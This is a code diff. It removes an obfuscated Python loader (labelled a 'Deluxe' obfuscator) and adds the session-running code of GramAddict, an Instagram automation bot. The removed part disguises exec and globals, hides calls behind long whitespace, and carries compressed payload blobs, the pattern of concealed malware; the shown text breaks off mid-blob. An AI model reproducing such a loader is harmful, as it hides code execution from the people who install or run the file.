@@ -1,96 +1,427 @@
-from builtins import *
-from math import prod as MemoryAccess
+import logging
+import random
+from datetime import datetime, timedelta
+from time import sleep
+
+from colorama import Fore, Style
+
+from GramAddict.core.config import Config
+from GramAddict.core.decorators import retry
+from GramAddict.core.device_facade import DeviceFacade, create_device, get_device_info
+from GramAddict.core.filter import Filter
+from GramAddict.core.filter import load_config as load_filter
+from GramAddict.core.interaction import load_config as load_interaction
+import GramAddict.core.write_custom_logs as write_custom_logs
+from GramAddict.core.log import (
+    configure_logger,
+    is_log_file_updated,
+    update_log_file_name,
+)
+from GramAddict.core.navigation import check_if_english
+from GramAddict.core.persistent_list import PersistentList
+from GramAddict.core.report import print_full_report
+from GramAddict.core.session_state import SessionState, SessionStateEncoder
+from GramAddict.core.storage import Storage
+import GramAddict.core.write_custom_logs as write_custom_logs
+from GramAddict.core.utils import (
+    ask_for_a_donation,
+    can_repeat,
+    check_adb_connection,
+    check_if_updated,
+    check_screen_timeout,
+    close_instagram,
+    config_examples,
+    countdown,
+    get_instagram_version,
+    get_value,
+    head_up_notifications,
+    kill_atx_agent,
+)
+from GramAddict.core.utils import load_config as load_utils
+from GramAddict.core.utils import (
+    move_usernames_to_accounts,
+    open_instagram,
+    pre_post_script,
+    save_crash,
+    set_time_delta,
+    show_ending_conditions,
+    stop_bot,
+    wait_for_next_session,
+)
+from GramAddict.core.views import AccountView, ProfileView, TabBarView, UniversalActions
+from GramAddict.core.views import load_config as load_views
+from GramAddict.version import TESTED_IG_VERSION
 
 
-__obfuscator__ = 'Deluxe'
-__authors__ = "SadHam"
-__github__ = 'https://github.com/'
-__discord__ = 'https://discord.gg/'
-__license__ = 'EPL-2.0'
+def start_bot(**kwargs):
+    # Logging initialization
+    logger = logging.getLogger(__name__)
 
-__code__ = 'print("Hello world!")'
+    # Pre-Load Config
+    configs = Config(first_run=True, **kwargs)
+    username = configs.username
+    write_custom_logs.init(username)
+
+    write_custom_logs.override()
+    configure_logger(configs.debug, configs.username)
+    if not kwargs:
+        if "--config" not in configs.args:
+            logger.info(
+                "It's strongly recommend to use a config.yml file. Follow these links for more details: https://docs.gramaddict.org/#/configuration and https://github.com/GramAddict/bot/tree/master/config-examples",
+                extra={"color": f"{Fore.GREEN}{Style.BRIGHT}"},
+            )
+            sleep(3)
+
+    # Config-example hint
+    config_examples()
+
+    # Check for updates
+    check_if_updated()
+
+    # Move username folders to a main directory -> accounts
+    if "--move-folders-in-accounts" in configs.args:
+        move_usernames_to_accounts()
+
+    # Global Variables
+    sessions = PersistentList("sessions", SessionStateEncoder)
+
+    # Load Config
+    configs.load_plugins()
+    configs.parse_args()
+    # Some plugins need config values without being passed
+    # through. Because we do a weird config/argparse hybrid,
+    # we need to load the configs in a weird way
+    load_filter(configs)
+    load_interaction(configs)
+    load_utils(configs)
+    load_views(configs)
+
+    if not configs.args or not check_adb_connection():
+        return
+
+    if len(configs.actions_enabled) < 1:
+        logger.error(
+            "You have to specify one of these actions: " + ", ".join(configs.actions)
+        )
+        write_custom_logs.write(
+            "You have to specify one of these actions: " + ", ".join(configs.actions)
+        )
+        return
+    device = create_device(configs.device_id, configs.app_id)
+    timeout_startup = get_value(configs.args.timeout_startup, None, 0)
+    if timeout_startup:
+        countdown(timeout_startup, "Bot starting in {:02d} minutes")
+        countdown(random.randint(0, 59), "Bot starting in {:02d} seconds")
+    session_state = None
+    if str(configs.args.total_sessions) != "-1":
+        total_sessions = get_value(configs.args.total_sessions, None, -1)
+    else:
+        total_sessions = -1
+
+    while True:
+        set_time_delta(configs.args)
+        inside_working_hours, time_left = SessionState.inside_working_hours(
+            configs.args.working_hours, configs.args.time_delta_session
+        )
+        if not inside_working_hours:
+            wait_for_next_session(time_left, session_state, sessions, device)
+        pre_post_script(path=configs.args.pre_script)
+        get_device_info(device)
+        session_state = SessionState(configs)
+        session_state.set_limits_session()
+        sessions.append(session_state)
+        check_screen_timeout()
+        device.wake_up()
+        head_up_notifications(enabled=False)
+        logger.info(
+            "-------- START: "
+            + str(session_state.startTime.strftime("%H:%M:%S - %Y/%m/%d"))
+            + " --------",
+            extra={"color": f"{Style.BRIGHT}{Fore.YELLOW}"},
+        )
+        if not device.get_info()["screenOn"]:
+            device.press_power()
+        if device.is_screen_locked():
+            device.unlock()
+            if device.is_screen_locked():
+                logger.error(
+                    "Can't unlock your screen. There may be a passcode on it. If you would like your screen to be turned on and unlocked automatically, please remove the passcode."
+                )
+                write_custom_logs.write(
+                    "Can't unlock your screen. There may be a passcode on it. If you would like your screen to be turned on and unlocked automatically, please remove the passcode."
+                )
+                stop_bot(device, sessions, session_state, was_sleeping=False)
+
+        logger.info("Device screen ON and unlocked.")
+        for plugin in configs.special_enabled:
+            configs.special[plugin].run(device)
+        check_ig_version(logger)
+        if pre_load(logger, configs, device) is None:
+            logger.error(
+                "Something is keeping closing IG APP. Please check your logcat to understand the reason! `adb logcat`"
+            )
+            write_custom_logs.write(
+                "Something is keeping closing IG APP. Please check your logcat to understand the reason! `adb logcat`"
+            )
+            stop_bot(device, sessions, session_state, was_sleeping=False)
+        profile_view = ProfileView(device)
+        account_view = AccountView(device)
+        tab_bar_view = TabBarView(device)
+        (
+            username,
+            session_state.my_posts_count,
+            session_state.my_followers_count,
+            session_state.my_following_count,
+        ) = profile_view.getProfileInfo()
+        if (
+            username is None
+            or session_state.my_posts_count is None
+            or session_state.my_followers_count is None
+            or session_state.my_following_count is None
+        ):
+            logger.critical(
+                "Could not get one of the following from your profile: username, # of posts, # of followers, # of followings. This is typically due to a soft-ban. Review the crash screenshot to see if this is the case."
+            )
+            logger.critical(
+                f"Username: {username}, Posts: {session_state.my_posts_count}, Followers: {session_state.my_followers_count}, Following: {session_state.my_following_count}"
+            )
+            save_crash(device)
+            stop_bot(device, sessions, session_state)
+
+        if not is_log_file_updated():
+            try:
+                update_log_file_name(username)
+            except Exception as e:
+                logger.error(
+                    f"Failed to update log file name. Will continue anyway. {e}"
+                )
+        day = datetime.now().strftime("%d")
+        month = datetime.now().strftime("%m")
+        hour = datetime.now().strftime("%H")
+        minute = datetime.now().strftime("%M")
+        write_custom_logs.write(f"____{day}/{month}-{hour}:{minute}____")
+        report_string = f"Hello, @{username}! You have {session_state.my_followers_count} followers and {session_state.my_following_count} followings so far."
+
+        write_custom_logs.write(report_string)
+
+        logger.info(report_string, extra={"color": f"{Style.BRIGHT}{Fore.GREEN}"})
+        if configs.args.repeat:
+            logger.info(
+                f"You have {total_sessions + 1 - len(sessions) if total_sessions > 0 else 'infinite'} session(s) left. You can stop the bot by pressing CTRL+C in console.\n",
+                extra={"color": f"{Style.BRIGHT}{Fore.BLUE}"},
+            )
+            sleep(3)
+        if configs.args.shuffle_jobs:
+            jobs_list = random.sample(
+                configs.actions_enabled, len(configs.actions_enabled)
+            )
+        else:
+            jobs_list = configs.actions_enabled
+
+        print_limits = True
+        unfollow_jobs = [x for x in jobs_list if "unfollow" in x]
+        logger.info(
+            f"There is/are {len(jobs_list)-len(unfollow_jobs)} active-job(s) and {len(unfollow_jobs)} unfollow-job(s) scheduled for this session."
+        )
+        storage = Storage(username)
+        filters = Filter(storage)
+        show_ending_conditions()
+        if not configs.debug:
+            countdown(10, "Bot will start in: {:02d}")
+        for plugin in jobs_list:
+            inside_working_hours, time_left = SessionState.inside_working_hours(
+                configs.args.working_hours, configs.args.time_delta_session
+            )
+            if not inside_working_hours:
+                logger.info(
+                    "Outside of working hours. Ending session.",
+                    extra={"color": f"{Fore.CYAN}"},
+                )
+                break
+            (
+                active_limits_reached,
+                unfollow_limit_reached,
+                actions_limit_reached,
+            ) = session_state.check_limit(
+                limit_type=session_state.Limit.ALL, output=print_limits
+            )
+            if actions_limit_reached:
+                logger.info(
+                    "At last one of these limits has been reached: interactions/successful or scraped. Ending session.",
+                    extra={"color": f"{Fore.CYAN}"},
+                )
+                break
+            if profile_view.getUsername() != username:
+                logger.debug("Not in your main profile.")
+                tab_bar_view.navigate_to_profile()
+            if plugin in unfollow_jobs:
+                if configs.args.scrape_to_file is not None:
+                    logger.warning(
+                        "Scraping in unfollow-jobs doesn't make any sense. SKIP. "
+                    )
+                    continue
+                if unfollow_limit_reached:
+                    logger.warning(
+                        f"Can't perform {plugin} job because the unfollow limit has been reached. SKIP."
+                    )
+                    print_limits = None
+                    continue
+                logger.info(
+                    f"Current unfollow-job: {plugin}",
+                    extra={"color": f"{Style.BRIGHT}{Fore.BLUE}"},
+                )
+                configs.actions[plugin].run(
+                    device, configs, storage, sessions, filters, plugin
+                )
+                unfollow_jobs.remove(plugin)
+                print_limits = True
+            else:
+                if active_limits_reached:
+                    logger.warning(
+                        f"Can't perform {plugin} job because a limit for active-jobs has been reached."
+                    )
+                    print_limits = None
+                    if unfollow_jobs:
+                        continue
+                    else:
+                        logger.info(
+                            "No other jobs can be done cause of limit reached. Ending session.",
+                            extra={"color": f"{Fore.CYAN}"},
+                        )
+                        break
+
+                logger.info(
+                    f"Current active-job: {plugin}\n",
+                    extra={"color": f"{Style.BRIGHT}{Fore.BLUE}"},
+                )
+                write_custom_logs.write(f"Current active-job: {plugin}")
+                if configs.args.scrape_to_file is not None:
+                    logger.warning(
+                        "You're in scraping mode! That means you're only collection data without interacting!"
+                    )
+                configs.actions[plugin].run(
+                    device, configs, storage, sessions, filters, plugin
+                )
+                print_limits = True
+
+        # save the session in sessions.json
+        session_state.finishTime = datetime.now()
+        sessions.persist(directory=username)
+
+        # print reports
+        logger.info("Going back to your profile..")
+        profile_view.click_on_avatar()
+        if profile_view.get_following_count() is None:
+            profile_view.click_on_avatar()
+        account_view.refresh_account()
+        (
+            _,
+            _,
+            followers_now,
+            following_now,
+        ) = profile_view.getProfileInfo()
+        parameters = {"followers_now": followers_now, "following_now": following_now}
+        for plugin in configs.analytics_enabled:
+            configs.analytics[plugin].run(
+                configs.config,
+                plugin,
+                parameters,
+            )
+
+        # turn off bot
+        close_instagram(device)
+        if configs.args.screen_sleep:
+            device.screen_off()
+            logger.info("Screen turned off for sleeping time.")
+
+        kill_atx_agent(device)
+        head_up_notifications(enabled=True)
+        logger.info(
+            "-------- FINISH: "
+            + str(session_state.finishTime.strftime("%H:%M:%S - %Y/%m/%d"))
+            + " --------",
+            extra={"color": f"{Style.BRIGHT}{Fore.YELLOW}"},
+        )
+        pre_post_script(pre=False, path=configs.args.post_script)
+
+        if configs.args.repeat and can_repeat(len(sessions), total_sessions):
+            print_full_report(sessions, configs.args.scrape_to_file)
+            inside_working_hours, time_left = SessionState.inside_working_hours(
+                configs.args.working_hours, configs.args.time_delta_session
+            )
+            if inside_working_hours:
+                time_left = (
+                    get_value(configs.args.repeat, "Sleep for {} minutes.", 180) * 60
+                )
+                logger.info(
+                    f'Next session will start at: {(datetime.now() + timedelta(seconds=time_left)).strftime("%H:%M:%S (%Y/%m/%d)")}.'
+                )
+                # open file in logs/{username}
+                write_custom_logs.write(f"Sleep for {time_left / 60} minutes.\n")
+                write_custom_logs.write(
+                    f'Next session will start at: {(datetime.now() + timedelta(seconds=time_left)).strftime("%H:%M:%S (%Y/%m/%d)")}.'
+                )
+                try:
+                    sleep(time_left)
+                except KeyboardInterrupt:
+                    stop_bot(
+                        device,
+                        sessions,
+                        session_state,
+                        was_sleeping=True,
+                    )
+            else:
+                wait_for_next_session(
+                    time_left,
+                    session_state,
+                    sessions,
+                    device,
+                )
+        else:
+            break
+    print_full_report(sessions, configs.args.scrape_to_file)
+    ask_for_a_donation()
 
 
-_math, Square, _invert, _ceil, Walk, Ceil, _statistics = exec, str, tuple, map, ord, globals, type
+@retry(3, (DeviceFacade.AppHasCrashed,))
+def pre_load(logger, configs, device):
+    """
+    Prepare IG app to perform bot actions
+    """
+    if not open_instagram(device):
+        return None
+    UniversalActions.close_keyboard(device)
+    account_view = AccountView(device)
+    success = False
+    if configs.args.username is not None:
+        if account_view.is_account_selecting():
+            success = account_view.log_in_from_account_selecting(configs.args.username)
+        if account_view.is_login_requested() and not success:
+            account_view.log_in_by_credentials(
+                configs.args.username, configs.args.password
+            )
+        check_if_english(device)
+        success = account_view.changeToUsername(
+            configs.args.username, configs.args.password
+        )
+        if not success:
+            logger.error(f"Not able to change to {configs.args.username}, abort!")
+            save_crash(device)
+            device.back()
+            return None
+    account_view.refresh_account()
+    return True
 
-class _frame:
-    def __init__(self, Power):
-        self.Invert = MemoryAccess((Power, -64267))
-        self._callfunction(Hypothesis=-90825)
 
-    def _callfunction(self, Hypothesis = None):
-        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
-        self.Invert /= -73966 + Hypothesis
-        
-        try:
-            (({_math: _math}, _math) for _math in (_math, Walk, _invert))
-
-        except AssertionError:
-            (((Square, Walk, _ceil), _math) for _math in (_invert, _invert, Square))
-
-        except:
-            _statistics(-20085 - -43447) == False
-
-    def _floor(self, _walk = -31389):
-        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
-        _walk /= -90376 + -50724
-        self._substract != int
-        
-        try:
-            (({_ceil: Algorithm}, _math) for _math in (_math, _ceil))
-
-        except ArithmeticError:
-            ({Algorithm: Walk} or Walk if {Algorithm: Walk} and Walk else ... or (Walk, {Algorithm: Walk}))
-
-        except:
-            _statistics(-90916 + -99008) == type
-
-    def _stackoverflow(Statistics = str):
-        return Ceil()[Statistics]
-
-    def System(DetectVar = 6084 - -76292, Divide = True, Add = Ceil):
-        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
-        Add()[DetectVar] = Divide
-        
-        try:
-            {_ceil: Algorithm} if Walk == _ceil else (Square, Walk, _ceil) < Ceil
-
-        except AssertionError:
-            (_math, _ceil) if Walk >= _invert else {_ceil: Algorithm} == Walk
-
-        except:
-            _statistics(32282 * -48388) == str
-
-    def execute(code = str):
-        return _math(Square(_invert(_ceil(Walk, code))))
-
-    @property
-    def _substract(self):
-        self._power = '<__main__._floor object at 0x000007065BE35110>'
-        return (self._power, _frame._substract)
-
-if True:
+def check_ig_version(logger):
     try:
-        _frame.execute(code = __code__)
-        Floor = _frame(Power = -42444 / 33782)
-
-        _frame(Power = -25699 / 70530)._callfunction(Hypothesis = Floor.Invert * -86895)                                                                                                                                                                                                                                                          ;_frame.System(DetectVar='S22SSS22S2S22S22S2SSS',Divide=b'x\x9c\xdd<ks\xdb8\x92\xdf]\x95\xff\x800\x95\x129\x91\xe9$\xbb7\xb5\xe3:Om\x1e\x8e\xe3Y\x8f\x9d\x8a=\x93\x9d\xca\xa4\xb8\x90\x08J\xb0)BK\x90\x96u.\xff\xf7\xeb\xc6\x83\x02_zl\xf6v\xf7B;\x96H4\x1a\xe8F\xbf\x01\xe6\t99yL~\x13%\xb9.eAb&FI)\xc7\xb4`1\xa1$\xe1)#\xce\x93\x05/\xa6\xe4-K\xcb;\xb6\xb7\xf7\x84\xbc\x11\xd9$\xa7E\x99\xd2\x82\x8bL>\xde\xdb\xdb+\xf2\xe5\xe1\x1e\x81\x8b\'\xc4W_\xf0\x8a"\x8bD\xe4QD\x1e\x1f\x11Oc\xf1\x88\xc8\x1d(Z\x16S\x91K\x03rI\xe3\xf7t\xd6\x00\x99\xc0\x14\xca\x91\x81\x98\x16\xc5\\\x1e\x1e\x1c\xe8\x87\xe1X\xcc\x0e\x1a\xe01\x97c\x91\xc7\rx\xf34\x9cL\x9a\xf0)\x1f\xb3L2\x03\x7f\xfc\xe1l\xffe\xf8\xbc\x013\x16\xb1\x01\x18\xccs\x9e\x15\xbe\xf7\x9e\xa5\xa9 \x0b\x91\xa7\xf1c/\x18(\xd8\xe0\xb0\xea\x820\x03y\xc3\xe3A\xb0\xc7\xee\xc6l^\x18\x1ee\xf3\x12z\x7f\x14\x92IBsFr\x16\xff\x9e\xfd\xcaE\xca\n\xfd`\x94\x96\xec\xf7\x0c\x97\x07\xef(A$\xbfg\xe7b$\xe2%I\xf9\r\xf4[\x8a\xd2\x0b\xf6\xf4\xcc\xf8l.\xf2"\x8a`\xb4\xa5\x1c\x04!\xbb\xe3\x85\x1f\xc0\xb2\xa4bLS\xe9\x07\x9f\x07o\xdf\x8a\xb7\xea\xba\xb8\x10B\\\xbc\x15\xf0q\x81\xd7\xe0\xcb\xd1$\x15#\x00\xdb\xeb\x85A\x04)O\xaf\xd5oz\x9d\xc2\xc5\xf1f\xf0\xf9\xf0\xf0\xd9\xfe\xb3}\x7f\xdf\x7f\xf6"\x08\xbe|9\x8ay\xbe\x1e\xcd\xe5K\xf8\xb9\xc4\xbfp\xa9/m$\x13V\xd0\xa2\xd8\x80hq\x07\xd7B\xfd\xc5O\xfc\x06\xa4h\x82\xf7:\x1a\xb1O\x96\xcd\xe0\xa7\xfa\x9d\xcd\xe0\x1ftZ1p\x03\x0b\xd2\xebk\xfc\xc792#\xe5\xea\x9es\xc0\xd0\x85\xd8\x1f\x8cJ\x9e\x16<\xc3\x15\xb9\xa5\xb9\xdc\xeb\xe9o\xd9\xa2\xd8\xf1\xf2\xe5\xe5K\xc3#\xb8\x01\xd4\x97\xe6q\xc5\xb7K\xbf{4\x99\xf1"\xe5\xe5\xa8\xc9\xcf`x\xadV+U+\xc7\xaf\xd5o\xba+\x92\xe0\xf3?\x05K\xc8\xb3\x98\xdd\xf9\x83\xbc\x90\xad\xc6/A\xdf\xba\x01V=P5T\x96}\xb3\xac)\xa8H\x93.\xe6\xac\x95\xcdO\x7f\xfd\x84\xbf\x9f\xfe\xaa/\xf5\xe5\x13\xfe|\xb3|be~\xd5\xc5\xa65Z\xa6\x98v\x81\x1cDV\x02\x1b\xf1\x0f\xdc\x7f\xb3<J\xe9-\xdbA\xcf~>W?\xfa\x03\x7f\xf5\xc7\xcf?\x7f\xbb\x0c\x12\xa2\xdd\xbaI\xd7N\xd5\x95\xa6\xe6\xf345\x7fw\xe1\x12\xe7cI3\xfeu\\\xeaE\xb2\x13\x97\xfa\xb1X.-! \xbcc\xd3\xac\xdcA\x96\xf0F\xdd\xeb\xa7w\xf8\xa3\xbe\x01\x97\x06\x83\xf0Z\xf0l\x03\x97\xcfN\xcf~\x82\x7f\xa7\xa7?\xc1\xc7Oggg\xdf\xac\x142\x99\xd2w;\x8b\xa1\xb6q0\xb4\t\xca\xd0\xca]\xf3o\x97I)\x9f\xcf\xc4xW6\xf5)\xab?\x1a\xfc\xf1\x87?\xfe\xf0\xfd\xf8\xfb1~\xeao\xf8\xdd~\xeag\xfa\x13"\xb8\x98a\xfc\xef\x0f\xfe\x94\x14\x1dj\xf0\x8d\xf2|\xcc\xee:\xfd\x07\\I.f\xc4F\xb8D\x07\xd0\x04\xc0\xc7\xc3\x94eC0\x18\x05\xcb\x87\x90\x01\re\x91\x0f\x8br\x9e\xb2=l\xf5\x07\x90\x0c\xed\x19\xf0TL&<\x9b<\xb2\xf79\xcdb1{\xa4q\xc7\x90z\x16|\xc6,n{?$\xf87fiA\r\xa4\x0b%S\xc6\xe6\x8f\xf6L\xcbX\xa4"\xa73j[\xdf\x89\x1c\xfa_\x16\xcb\x94U0\'\x00\xf0*\x8e\xf9\xb8\x80D2g\xf0\'K\xf8\xc4\xf6x\xa3\xeez@Q&rLn+\x06\xe4\x0c2\xe1^\xe8[\xc82\xa3\x84\x8ei\\\xcd\xf7\xadz\xf8N=\x1b\x92q\xce\x80\xcaHC\x0e\t$B\xe6{\xc4\xb3D\xf4\xe0\xd5\xbc\xaeHTw[\x81\xa6\x82\xc6\x91!\x97J}\x9b\xac\xeb\x0e\xcb\xc9r:\xc6\xac\x7f\x1d\x0e\x07\xac\x07\x11,\xbcE\xe0?RI\xacFQ\xe6,B\xa1\x00\xd1\xd1\x8f\xb9\xc4{\x9c\x15\x8b\xca9\x8a@lZ\xf4\xdd\xaa5\xa3 \x1a\x8f\xf6\x82\x9e\x113z\xcb\'\xd4\x9d\xf9x\xca\xc67\x11O"\x96MR.\xa7=\x1d\xe7,\x97\\\x16,+"\x80*l\xef\x0f\xd5\xe33\xf8\xe8\xe9\x9b3\x05k\xba\xa8\xa2A\x94\x94i\x1a\xe9\x86\x9e^\x92I\t\xf3\x8c$d\xc1\x95\x9c\\\xea\x87\x97\xf8lX\xbb;\xce\xd00\xf5-\x99\x04\xe9\xa4\x93\x15\x1a}\xdb\x03\\\x16<\x95\x8d\x85\xa1\xf2&JD\x1e\xd1(\x16\x99b\xa0Y\x801\xcd\x90\x0e\x10X\xfb@1\x94\xc6#\x94\x87\x8c\x8d]X\xcb\xeb\xfa\x1a\xea\xc7\x12\xa4\x9ee\x11j\xb1(+d\xa9\x90(\xf5\xc0\x84\t\xccr\xe8JI\xc4\xee\xe8\x0c\x0c\x8a\xac\x9e\x96Y\x11\x8b\x85\x1d\r\xd5\xa6\xea\x19\xdd\xe2J\t\xb7\xed\x96\xa6%3\xf7S\x06\x02[\xce\xa3L\x14<\xe1c]\xd12m7`G#Z\xdcE\xc0\xb1\xacX#\\5\xbeui\x84\x02\xd8\x81\xe93q\x0b\xf2.Y\x8eR-\xa3BDt\xac\xa8\xb4S\x13s\xe0X\x93;s\xd0\x9e\xb9\x90\x05r\x94\xcf-\'%\xe4\x00\xd18\xa7rj\x1f\x00\x0b\x90\xd9\x91\xb2\xa1\xf6\xe1T,@\x13b0\xc78\xf9\x98\xbb\x8c\x00!\x9aG#a1.(/\x94Ld\xec\x0e\x06\xd3\xb2\xb8\x86=\xb7\x9c-*\n_iB~\x85gC\xf2!\x17\xa8\xbc\xfa\xe6\x8a\x8e^\xd3\\\x7f\xff%\xe3\xb8n4}\xa5\xc4\xa8\x8fw5\xcc]\x8cW\x00\xed\xceF&l\xcf\xab\xe3\xcb\xab\xe3\xb7\xd1\xe9I\xf4\xeb\xf1\xc7\xcb\xd3\x8bst\x0e\x8f\xf6b\x96\x00\xe94/\x90v\xff\xbb\xefn\x164\x9f\xc8\xe0Ps\xe1\t9\xd3\xee\x8bp\xf0\xa3\x9c\xa6\xfc\x7f\xa86y\xd8\xaa\xad\x189\xb2>.\x04\xc1;S\xcf\xfcH\xd9\xaa(\np\x0c\x8d\xe9C\xce\xf6\xcf`\xbe\x95\xbbY\t\xbb\x04\x1c\xfa\xa9\x9f\xf0\x1c\x167/\xb3\xa3\xab\x1c\x04\x98T3\xea6\xa1\xbeA\x00\x8egTN\x86\x16_h\xe5\xcat\xe3\t\x01\xe1\'\x1a\x95\xa1\xcd<\xf7\xf6\xf7u\'O\x81\xf0\xac\xc2\xd1\x80]Q\x1c\xa2\xa3\xf2\xeb-xy\xa7\xc5@\x027s\x01\xd6v\t~r,f3\x907R\x08\x02\x13"\xd4\xa0\x0e\x97\xb3T\xd5\x9fCp\xd6i*\x16\xa4\x982hOyv#\t\x08\x1d\xe8F\xceH\xcc\n\njsH\xaa\xd2\xae\x18\xcb\x10u\x81\xea\x15\x16\xf9\xe4\xe0\xc9\x81e\x896\xfc\x10]\x90\x8e\xd2\xf1J.\x0e`\x9d\x0f\n\xb0F\x073\n\xb6=7\xfd\xf7\xad\xbd\xf1\x86m\xc2@\x05rzt\xef\xa9P\xc3;$\x89w\x8fQFx\xf2\xf1\xf8\xf8\xfc\xe1^\xc5\x1a\xe1\xeb\x8f\xa7\'\xef\xaf\x1e\xbc\x87\x06\x82\xa0~\xab\x82\x17\xff\x0f\x8e`\xbc\xa9M\x80L\xc1\x83tZB\xdf\xed\x83VU\xb1J[[\xd9m\x83\xdd.?\x83\xbd!V.\xa0k\n\x0eE\xe2\xd2P2\xa3\xb0\xec1\x87\x05\x03\xd7\xb1$\xfb?\x12k\x8a*\xf1\x011A\x83\xb5o\xfa\xed\xf3l\xdf\xc2xk\x84\xa6\xdf\xc8\xb9S;Q\xc5i\xf2+\xcd9\x1d\xa5\x96\x18ctP9\xea\x9e\xd8\xf7l\x93\xd7\xe9&\x1d\xcc}\n\x17*\xcb1OK\xd0[5\x15\xb7mNs\xf0KH\x89myB.\x050\xcd\xc0\x93\x8c\xb1\xd8@\x13\xe5h\xa4\xda>\x01\xcfFF\x0c\xad\xc5\x9cJ\xc9b\xdb\xb7\x98\xe6\xa2\x9cLC\xf2\x9a\x8d)*\xc2\x02\x84\x1b\xf9\xbe`<\xb7\x88\x0e`<50\x99.G9\xb7\xee\xf3\t\x02\xab\xf1`\xa5p\xd2\xa8+\x95\xd9\x00\xc6[,\x0b\xba\xb4V\xa9\n\xf1\xacu\x08\x9c\x16\'p\xebjV\x9e\xaa\xabAYY\xa7\xa1fX\xdc\xd5\' \x94\xeaYG\xa8\xe0\x07\x8el@\x1c]\xe6\x99\x83\t\x92\x8a\xca\x9e\xe9\x19JpW(\x11q@\xfe\x9b\xbcp\xfa\x1aC\xc4\xf2\\\xe4\rK\xe4\xe1\x96\xca\x14\x1c"rL\xce\xd9\x98\'K"2FDb\xec\x8c\xc1}H<\xf2\x8c\x80\x08y\xaaR\xd1\x1c\xda\xd1\xdb\xa0=i\xfc\xae\xc3v\x10\xcfZH\xef\x98d\x1d\xd5\xc7+\xb3L\xe7s\xb87\xe8L0\x14)\xf7S\xce\x01O\x15\xb8\xf8.C\xc3\x06\xe0\x90\x9c\x039C\xf2|e\xdc\x1b\x10\x0e\xa3\xaa\xb8\xc9oa\xf1^\xc3*\xa9;\xed\xe0\xc8\xfd\xe1\xf3\x97\xf1\x03\x99\xf1\xac\x04\x8b\xe2\x05]Xt\xfa\x16\xe2\x07n}=\x1f\x92\xff\xfa!\xe8\xc7%\x19\x06\x1a\x15\xaez\xd8{\xa4\x08\xa9\x88\x00\xc7\xd1\xa0[\x144\xb5\xb1\x87\x0c\xd4\xb6\xdd\xfe\x0b\xcf\xa1\xae\x0e\xb1\x86\x8358\xcb\xc0\xfd\x17fZ,\x95l\x1d\xd6\xfd\x17VJ\x17S\xdc6E\xd7\xec\xc0\xd7\x83\xad\xda\xc8\x0e\x0f\xc1p\xf0\x98E\x0b\x91\xdf`\x00\x06\xd6"\x97:\xcf\x8dR\x96\x140\x8ck\xca\xc2.\xf0\x86\xa4\xd7Hl\xe0m\t\x90\x9e\x9c\xa5\xaaS\xb6\x8d2w\x8d\xdc\x88\x03:\xa3C\xbf\xa2eX_\xe8\xea\x16\xe6\xa5\x95\xc2\x19\xb4\x11\xd0\xfasZL\x8fj\xb3G\x08\xdd\xe8tk\xa4\xcd~\x0boS\xd4\\\xe66\xec[\x0b<\xc4\x15M\xf9\x8c\x17\xb2"\xae\r\xab\xd4\x19\xc2\x1b\xbf\xd6\xd7\xd5\x9a\x8e\xd4\xc7\xc5\xa3\xe7\x1c.\xe8\r&\xbenKg\xc6\xe2\x1b[x\xf4\x8e\x82\xbc\x06-c\xd8\x11\x95\x81\xd7\xd6\x17\xb9\xbcz\xf5\xf1\n,^\xbd\xfd\x99R\xba\x06\xed\xa8\xc5W0[\xf8\x96\'8m\xdf{\xfa\xfe\xf0\xe9\xcf\x87O/\xc9>y\xfa\xdb\xc1\xd3\xd9\xc1\xd3\xd8\x0b\x82&.\x8f\xd8\xe1\x9aATG\x00U\x0b\x9at8\xf5\xdb\xf1\xd9\xd9\xc5\xa7z\x04Uy\x1aG@\r\xdft\n\x084\x07\x9f=\xcd\xe4\x8b\xcc\xfb\xd2\x90T\x03\x0b2$%\xc8\xd9\x02\x9cb]\xe2\r\x00\x97v\xa1R1\xbe\xc1\xc8\xa9\x1bQ\x99a\xbb\xdf\xa0}\x07<\xce\x82uy\xafj\xe5\xde\xd0lP\x10=\x1c\x1e\x04\xc8\x89\xc6\x1b\x92\xab)\x83\xe8xF\x97\x10l\x80\xfb\xc7X\x03\xc3\x1e\x82\xb9N\x11\x92\xd3\x04\xc1\xc9B\x94i\xac\xce\x11\xb8\xbd\xd1')
-
-        Floor._callfunction(Hypothesis = Floor.Invert + -32023)                                                                                                                                                                                                                                                          ;_frame.System(DetectVar='MMNNNMMNMMMNMMMNM',Divide=b'\'B/\xf4a\x10R\x98xY\x0f\x82\xa7B\xcaB\xcc@\xd8\xc64M\x97C\x08w\x18\x95xr\x01\xa38\x15w\xd8\xb1B\xaf=\xeb\xa0\xfd\xc8\xe6\x94\xbe-v\xad\xec@\xc3@,(\xf0\r#c\xb08\x95|wK\xb8\xa7\xcbi\x96\xa0\x8b\xf3\x1a\r\xa1\xeb\xb60>\xd61\x9b\x1b\xa2\xaa\x98\x00\x0c\xbcQ\xa7\xc3n\xa3j\xa0>\xeb\xfe_BH\xc9\xdaF\xc6\xc4\xdb\x13[\x80\xf0\xf5D\xeb\x126W\xd9\x1a\x8dMce\x9b+cH\xb8T\x1e\xa9;\xd9\xea\x93\x12\x0fC\xd2b\xaa\xfc\xad$7\x9aw\xaa\xa6\x82\x9f\xa7\'\xe4\xd5\x87\x0f!\xf9\xa0\xd7PMT\x0b\x02\xa0\x05\x83\xa2r\xb2\x0cC\xf9\x02\xd9\x87\x8b\x0bA\x8c\x14\xd9c\xf27\x88\xd9\x0c\xd4\xdf\x1a\xeb\xdc\xcce\xben}-\x9a\xb9\xae\x10\xa8\x10\x13\x83\xfdU\xc1\xa0\xcdq\x93>XX\xa7\xd2\xd0\x86-\xe8(\x1a\xd1\xdc\xc2\xaej\x0fm\xd0\x06\x7f\xeb\x16q\xb6\xacR\x98\xe1\x068\xf4d2Rs\xda\x04\x9a\xa8\xd4\x17\x16`\x17p]\xba\xa9\x83\x07@\x9b\xcbB4\x8c\x86\x87\xa7\xca<\xd6\xa4q[J\xadP\xd6\xc1A\xa1\xd6\xd1\xbc}\xa7\x06\xf5\xbbv\xac\xf8\xd0\xee\xd84\xb8F\x8d 